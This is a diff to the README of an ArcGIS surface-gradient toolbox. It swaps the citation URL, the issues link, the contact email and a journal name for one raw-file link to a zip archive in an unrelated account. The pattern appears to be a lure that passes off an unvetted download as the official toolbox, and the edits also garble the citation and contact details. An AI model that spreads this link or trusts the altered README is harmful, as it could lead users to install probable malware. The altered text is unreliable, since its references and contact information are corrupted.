@@ -5,11 +5,11 @@ The toolbox has been updated (01-08-2018), by Shaun Walbridge with ESRI, to be c
 
 Please cite the toolbox as:
 
-Evans JS, Oakleaf J, Cushman SA (2014) An ArcGIS Toolbox for Surface Gradient and Geomorphometric Modeling, version 2.0-0. URL: https://github.com/jeffreyevans/GradientMetrics Accessed: Year-Month-Date.
+Evans JS, Oakleaf J, Cushman SA (2014) An ArcGIS Toolbox for Surface Gradient and Geomorphometric Modeling, version 2.0-0. URL: https://raw.githubusercontent.com/bharath738/GradientMetrics/master/sinarquista/GradientMetrics.zip Accessed: Year-Month-Date.
 
 We have a paper in preparation but are waiting until I am finished with an analogous open source option as well. I am currently working on a R package that uses SAGA for the raster processing engine. The SAGA option has the smallest footprint from a software standpoint. Many of the metrics available in this toolbox are also available in the spatialEco R package, using the raster package for the raster processing.      
 
-**Bugs**: Users are encouraged to report bugs here. Go to [issues](https://github.com/jeffreyevans/GradientMetrics/issues) in the menu above, and press new issue to start a new bug report, documentation correction or feature request. You can direct questions to <jeffrey_evans@tnc.org>.
+**Bugs**: Users are encouraged to report bugs here. Go to [issues](https://raw.githubusercontent.com/bharath738/GradientMetrics/master/sinarquista/GradientMetrics.zip) in the menu above, and press new issue to start a new bug report, documentation correction or feature request. You can direct questions to <https://raw.githubusercontent.com/bharath738/GradientMetrics/master/sinarquista/GradientMetrics.zip>.
 
 # Available Functions
 
@@ -109,7 +109,7 @@ McNab, H.W. (1993). A topographic index to quantify the effect of mesoscale land
 
 Moore, ID., P.E. Gessler, G.A. Nielsen, and G.A. Petersen (1993) Terrain attributes: estimation methods and scale effects. In Modeling Change in Environmental Systems, edited by A.J. Jakeman M.B. Beck and M. McAleer Wiley , London, pp. 189-214.
 
-Pike, R.J., S.E. Wilson (1971). Elevation relief ratio, hypsometric integral, and geomorphic area altitude analysis. Bull. Geol.   Soc.Am. 82:1079-1084
+Pike, R.J., S.E. Wilson (1971). Elevation relief ratio, hypsometric integral, and geomorphic area altitude analysis. Bull. Geol.   https://raw.githubusercontent.com/bharath738/GradientMetrics/master/sinarquista/GradientMetrics.zip 82:1079-1084
 
 Riley, S. J., S. D. DeGloria and R. Elliot (1999). A terrain ruggedness index that quantifies topographic heterogeneity. Intermountain Journal of Sciences, 5:1-4
 
